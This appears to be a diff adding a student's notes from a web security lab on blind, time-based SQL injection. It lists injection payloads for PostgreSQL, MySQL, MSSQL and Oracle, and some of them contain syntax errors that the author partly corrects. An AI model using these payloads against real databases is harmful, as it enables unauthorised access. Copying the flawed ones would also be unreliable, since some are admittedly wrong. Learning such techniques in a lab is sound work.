@@ -1,0 +1,24 @@
+so, for this lab. the error were handles gracefully so nothing chanegs in the application if the query is right or wrong.
+Hence we have no way to know if our query is true or not or even check it response
+the syntax for the attack is just - IF (condition) WAITFOR DELAY '0:0:{delay in sec}--
+so i can not determine which database it is ence i will try for all
+
+POSTGRESQL
+' AND (SELECT CASE WHEN(1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+MySQL
+' OR IF ((1=1), SLEEP(5), 0)--
+
+MSSQL
+' AND IF (1=1) WAITFOR DELAY '0:0:10'--
+
+ORACLE
+' AND SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual--
+I also made a mistake here. SELECT after an AND should always start with a bracket.
+
+But none of them worked ! What i used above was conditional time delay. But still, my conditions are always true.
+
+I made a mistake in the PostgreSQL syntax, it is supposed to be
+' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END) IS NULL--
+1. Space after  the AND
+2. pg_sleep returns void, so the subquery is sth like SELECT void
